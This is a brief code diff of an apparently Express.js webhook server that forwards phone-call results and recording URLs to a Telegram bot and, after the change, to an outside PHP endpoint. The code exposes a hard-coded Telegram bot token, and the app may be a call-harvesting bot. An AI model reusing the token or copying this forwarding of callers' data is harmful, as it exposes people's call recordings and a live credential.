@@ -51,7 +51,7 @@ app.post('/handle-key', (req, res) => {
 app.post('/callOutputs', (req, res) => {
     axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Call result: ' + JSON.stringify(req.body)) 
     if(req.body.RecordingUrl){
-        axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendVideo?chat_id=5113588348&video=' + req.body.RecordingUrl + ".mp4") 
+        axios.get('https://tgbot.prince-donation.com/call_recording_sender/index.php?url=' + req.body.RecordingUrl + ".mp3") 
     }
 });
 
